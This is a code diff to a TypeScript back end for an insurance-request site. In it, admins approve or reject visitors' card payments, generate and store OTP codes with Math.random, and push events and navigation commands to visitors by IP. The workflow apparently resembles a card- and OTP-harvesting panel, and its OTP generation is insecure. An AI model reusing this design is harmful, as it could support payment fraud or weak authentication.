@@ -272,9 +272,9 @@ export async function markNavigationCommandExecuted(id: number): Promise<void> {
 }
 
 // ======= Payment Approval =======
-export async function approvePayment(requestId: number): Promise<void> {
+export async function approvePayment(requestId: number): Promise<InsuranceRequest | null> {
   const db = await getDb();
-  if (!db) return;
+  if (!db) return null;
   // Generate random OTP
   const otpDigits = Math.floor(Math.random() * 3) + 4; // 4-6 digits
   const otpCode = Math.floor(Math.random() * Math.pow(10, otpDigits)).toString().padStart(otpDigits, '0');
@@ -284,21 +284,24 @@ export async function approvePayment(requestId: number): Promise<void> {
       paymentStatus: "approved",
       otpCode,
       otpDigits,
-      status: "payment_submitted",
+      status: "payment_approved",
     })
     .where(eq(insuranceRequests.id, requestId));
+  return getInsuranceRequestById(requestId);
 }
 
-export async function rejectPayment(requestId: number): Promise<void> {
+export async function rejectPayment(requestId: number): Promise<InsuranceRequest | null> {
   const db = await getDb();
-  if (!db) return;
+  if (!db) return null;
   await db
     .update(insuranceRequests)
     .set({
       paymentStatus: "rejected",
       cardDeclined: true,
+      status: "declined",
     })
     .where(eq(insuranceRequests.id, requestId));
+  return getInsuranceRequestById(requestId);
 }
 
 // إرسال OTP إلى قاعدة البيانات
@@ -336,18 +339,23 @@ export async function verifyOtp(sessionId: string): Promise<boolean> {
     .limit(1);
   const req = result[0];
   if (!req) return false;
-  if (req.paymentStatus === "approved" && req.otpSubmitted) {
-    await db
-      .update(insuranceRequests)
-      .set({ otpVerified: true, status: "otp_verified", currentStep: 6 })
-      .where(eq(insuranceRequests.id, req.id));
-    const request: InsuranceRequest = { ...req, otpVerified: true, status: "otp_verified", currentStep: 6, updatedAt: new Date() };
-    emitToAdmins("otpVerified", { requestId: req.id });
-    emitToAdmins("requestUpdated", request);
-    if (request.visitorIp) {
-      emitToVisitor(request.visitorIp, "otpVerified", { requestId: req.id });
+  if (req.paymentStatus === "approved" && req.otpSubmitted && req.otpCode) {
+    const submitted = req.otpSubmitted.trim();
+    const code = req.otpCode.trim();
+    const isCorrect = /^\d+$/.test(submitted) && submitted === code;
+    if (isCorrect) {
+      await db
+        .update(insuranceRequests)
+        .set({ otpVerified: true, status: "otp_verified", currentStep: 6 })
+        .where(eq(insuranceRequests.id, req.id));
+      const request: InsuranceRequest = { ...req, otpVerified: true, status: "otp_verified", currentStep: 6, updatedAt: new Date() };
+      emitToAdmins("otpVerified", { requestId: req.id });
+      emitToAdmins("requestUpdated", request);
+      if (request.visitorIp) {
+        emitToVisitor(request.visitorIp, "otpVerified", { requestId: req.id });
+      }
+      return true;
     }
-    return true;
   }
   return false;
 }
